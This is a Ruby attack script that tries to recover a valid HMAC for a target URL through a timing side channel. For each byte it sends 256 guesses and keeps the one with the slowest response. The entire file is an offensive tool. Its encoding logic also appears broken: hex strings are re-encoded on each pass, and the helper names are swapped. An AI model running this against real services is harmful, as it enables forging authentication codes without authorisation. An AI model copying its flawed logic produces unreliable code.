#! /usr/bin/env ruby

require 'net/http'
require 'uri'
#
# Check arguments
#
if ARGV.size != 2
  puts "[+] HMAC Timing Discovery 1.0"
  puts "[+] Usage: #{__FILE__} <target url> <mac guess>"
  exit 1
end
#
# Setup
#
url      = ARGV[0]
base_mac = ARGV[1]
#
# Store response time in a struct
#
ResponseTime = Struct.new(:mac, :time)
#
# Gets reponse time for a given URI
# 
# URI::HTTP -> Fixnum
#
def get_response_time(uri)
  t0 = Time.now
  res = Net::HTTP.get_response(uri)

  Time.now - t0
end
#
# ASCII -> HEX String
#
def ascii_s(hex_s)
  [hex_s].pack('H*')
end
#
# HEX -> ASCII String
#
def hex_s(ascii_s)
  ascii_s.unpack('H*')[0]
end
#
# Guess byte at given index
# 
# ASCII, HEX -> HEX
#
def guess_next_byte(url, mac)
  (0..255).reduce(ResponseTime.new(mac, 0)) { |result, byte|
    tmp_mac = hex_s(mac + byte.chr)
    t       = get_response_time(URI.parse(url + tmp_mac))

    puts tmp_mac
    if t > result.time
      result.time = t
      result.mac  = tmp_mac
    end

    result

  }.mac
end
#
# MAIN
# 
# for each byte in the mac
valid_mac = ascii_s(base_mac).chars.reduce('') do |mac, char|
  mac += guess_next_byte(url, mac)
end

puts valid_mac
# guess byte
# check response time
# greatest response time is the correct one
# repeat for next byte